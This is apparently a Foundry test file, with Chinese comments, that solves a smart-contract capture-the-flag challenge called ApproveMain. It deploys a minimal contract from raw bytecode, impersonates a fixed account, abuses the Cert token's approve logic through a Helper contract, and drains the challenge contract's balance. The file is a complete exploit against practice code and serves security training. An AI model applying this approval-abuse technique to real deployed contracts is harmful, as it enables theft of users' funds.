// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/11.challenge_pro/ApproveMain.sol";

contract attackTest is Test {

    ApproveMain approveMain;
    Cert cert;

    function setUp() public{
        // 初始化题目
        approveMain = new ApproveMain();
        cert = approveMain.cert();
    }

    function test_isComplete() public {
        console.log("[before attack] level balance:",cert.balanceOf(address(approveMain)));

        // 1.创建一个合约用来作为spender
        address spender;
        {
            bytes memory bytecode = hex"600180f3";
            assembly {
                spender := create(0, add(bytecode, 0x20), mload(bytecode))
            }
            console.log("spender's length:",spender.code.length);
        }

        // 2.符合条件的EOA账户调用
        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);

        // 3.EOA账户成为admin
        cert.approve(address(spender),uint256(3));

        // 4.使用Helper帮助我们授权
        Helper helper = new Helper();
        helper.attack(address(cert),address(approveMain));

        // 5.授权完成之后，我们的EOA账户就可以取钱了
        cert.transferFrom(address(approveMain),address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4),cert.balanceOf(address(approveMain)));

        // 6.检查是否完成题目
        assertEq(approveMain.Complete(),true);
        console.log("[after attack] level balance:",cert.balanceOf(address(approveMain)));

        vm.stopBroadcast();
    }

}

contract Helper{
    function attack(address _addr, address _to) public{
        Cert(_addr).approve(_to,type(uint256).max);
    }
}